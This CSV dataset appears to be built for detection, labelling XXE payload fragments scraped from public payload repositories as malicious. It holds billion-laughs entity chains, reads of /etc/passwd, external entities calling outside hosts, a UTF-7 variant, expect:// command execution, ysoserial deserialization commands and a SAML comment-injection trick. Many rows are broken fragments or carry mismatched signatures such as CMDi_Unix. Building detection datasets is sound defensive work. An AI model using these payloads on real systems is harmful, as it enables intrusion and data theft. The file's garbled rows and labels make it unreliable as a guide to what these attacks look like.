Payload,Signature,AttackType,Severity,MITRE,Label,Description
"<!DOCTYPE lolz [<!ENTITY lol ""lol""><!ELEMENT lolz (#PCDATA)>",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<!ENTITY lol1 ""&lol;&lol;&lol;&lol;&lol;&lol;&lol;",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<!ENTITY lol2 ""&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"">",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<!ENTITY lol3 ""&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"">",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<!ENTITY lol4 ""&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"">",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<!ENTITY lol5 ""&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"">",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<!ENTITY lol6 ""&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"">",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<!ENTITY lol7 ""&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"">",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<!ENTITY lol8 ""&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"">",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<!ENTITY lol9 ""&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;"">",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<tag>&lol9;</tag>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
* XXE: Local File Inclusion Example,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<?xml version=""1.0""?>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<!DOCTYPE foo [  ,XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<!ELEMENT foo (#ANY)>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
* XXE: Blind Local File Inclusion Example (When first case doesn't return anything.),XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<?xml version=""1.0""?>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<!DOCTYPE foo [,XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<!ELEMENT foo (#ANY)>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
* XXE: Access Control Bypass (Loading Restricted Resources - PHP example),XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<?xml version=""1.0""?>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<!DOCTYPE foo [,XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<foo><result>&ac;</result></foo>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
* XXE:SSRF ( Server Side Request Forgery ) Example,CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<?xml version=""1.0""?>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<!DOCTYPE foo [  ,XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<!ELEMENT foo (#ANY)>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
*  XXE: (Remote Attack - Through External Xml Inclusion) Exmaple,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<?xml version=""1.0""?>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<!DOCTYPE lolz [,XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<!ENTITY test SYSTEM ""https://example.com/entity1.xml"">]>",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<lolz><lol>3..2..1...&test<lol></lolz>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
* XXE: UTF-7 Exmaple,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<?xml version=""1.0"" encoding=""UTF-7""?>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
+ADwAIQ-DOCTYPE foo+AFs +ADwAIQ-ELEMENT foo ANY +AD4,XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
+ADwAIQ-ENTITY xxe SYSTEM +ACI-http://hack-r.be:1337+ACI +AD4AXQA+,XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
+ADw-foo+AD4AJg-xxe+ADsAPA-/foo+AD4,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
* XXE: Base64 Encoded,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
* XXE: XXE inside SOAP Example,CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
<soap:Body>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
  <foo>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<?xml version=1.0""?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM ""file:///etc/passwd""> ]><foo>&xxe;</foo>""",XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
  </foo>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
</soap:Body>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
* XXE: XXE inside SVG,CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"<svg xmlns=""http://www.w3.org/2000/svg"" xmlns:xlink=""http://www.w3.org/1999/xlink"" width=""300"" version=""1.1"" height=""200"">",CMDi_Unix,XXE,Medium,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
"    <image xlink:href=""expect://ls""></image>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
</svg>,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from payloadbox/xxe-injection-payload-list repository (ismailtasdelen-patch-1 branch)
",CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=""1.0""?>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<!ENTITY lol ""lol"">",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<!ENTITY lol1 ""&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"">",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<!ENTITY lol2 ""&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"">",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<!ENTITY lol3 ""&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"">",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<!ENTITY lol4 ""&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"">",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<!ENTITY lol5 ""&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"">",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<!ENTITY lol6 ""&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"">",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<!ENTITY lol7 ""&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"">",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<!ENTITY lol8 ""&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"">",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<!ENTITY lol9 ""&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;"">",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,XXE_Generic,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
payload_header = {'content-type': 'text/xml'},XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=1.0""?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM ""http://publicServer.com/parameterEntity_oob.dtd"">%xxe;]><foo>bar</foo>""",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
var req = new XMLHttpRequest();,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
var xhr = new XMLHttpRequest();,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
var req = new XMLHttpRequest();,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
var req = new XMLHttpRequest();,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
var req = new XMLHttpRequest();,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
var req = new XMLHttpRequest();,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
cat my_long_cmd.txt | ysoserial.exe -o raw -g WindowsIdentity -f Json.Net -s,CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
cat my_long_cmd.txt | ysonet.exe -o raw -g WindowsIdentity -f Json.Net -s,CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
".\ysoserial.exe -g ObjectDataProvider -f XmlSerializer -c ""calc.exe""",CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=""1.0""?>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"    """,CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
<root type=""System.Data.Services.Internal.ExpandedWrapper",CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"> It extends the """,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"  """,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=""1.0"" encoding=""UTF-8""?>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<saml2:Issuer xmlns:saml2=""urn:oasis:names:tc:SAML:2.0:assertion"" Format=""urn:oasis:names:tc:SAML:2.0:nameidformat:entity"">REDACTED</saml2:Issuer>",CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<saml2p:Status xmlns:saml2p=""urn:oasis:names:tc:SAML:2.0:protocol"">",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<saml2:Assertion xmlns:saml2=""urn:oasis:names:tc:SAML:2.0:assertion"" ID=""id3945308408248426654986295"" IssueInstant=""2018-04-22T10:28:53.593Z"" Version=""2.0"">",CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<saml2:Issuer Format=""urn:oasis:names:tc:SAML:2.0:nameid-format:entity"" xmlns:saml2=""urn:oasis:names:tc:SAML:2.0:assertion"">REDACTED</saml2:Issuer>",CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<saml2:Subject xmlns:saml2=""urn:oasis:names:tc:SAML:2.0:assertion"">",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<saml2:Conditions NotBefore=""2018-04-22T10:23:53.593Z"" NotOnOrAfter=""2018-0422T10:33:53.593Z"" xmlns:saml2=""urn:oasis:names:tc:SAML:2.0:assertion"">",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<saml2:AuthnStatement AuthnInstant=""2018-04-22T10:28:49.876Z"" SessionIndex=""id1524392933593.694282512"" xmlns:saml2=""urn:oasis:names:tc:SAML:2.0:assertion"">",CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
<NameID>user@user.com<!--XMLCOMMENT-->.evil.com</NameID>,CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<?xml version=""1.0"" encoding=""UTF-8""?>",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<!ENTITY s ""s"">",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<!ENTITY f1 ""f1"">",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<saml2p:Response xmlns:saml2p=""urn:oasis:names:tc:SAML:2.0:protocol""",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"<samlp:Response xmlns:samlp=""urn:oasis:names:tc:SAML:2.0:protocol""",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,XXE,Medium,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"An alternative exploitation would use """,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
"* """,XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
",XXE_Generic,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
| Identity Injection       | Impersonate Another User Role                | ",CMDi_Unix,XXE,Low,T1190,Malicious,XXE payload from swisskyrepo/PayloadsAllTheThings repository (main branch)
